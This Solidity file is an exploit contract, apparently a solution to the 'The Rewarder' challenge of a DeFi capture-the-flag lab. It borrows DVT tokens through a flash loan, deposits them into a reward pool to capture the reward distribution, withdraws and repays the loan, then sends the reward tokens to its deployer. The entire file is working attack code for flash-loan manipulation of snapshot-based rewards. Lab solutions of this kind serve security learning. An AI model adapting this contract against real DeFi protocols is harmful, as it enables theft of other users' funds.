//SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import {TheRewarderPool} from "./TheRewarderPool.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract Exploit {
    FlashLoanerPool flashLoanerPool;
    TheRewarderPool theRewarderPool;
    IERC20 dvt;
    address owner;


    constructor( FlashLoanerPool _flashLoanerPool, TheRewarderPool _theRewarderPool, address _dvt ) {
        flashLoanerPool = _flashLoanerPool;
        theRewarderPool = _theRewarderPool;
        dvt = IERC20(_dvt);
        owner = msg.sender;
    }

    function attack(uint256 amount) external {
        flashLoanerPool.flashLoan(amount);
        IERC20(theRewarderPool.rewardToken()).transfer(owner, IERC20(theRewarderPool.rewardToken()).balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        dvt.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);
        dvt.transfer(address(flashLoanerPool), amount);
    }
}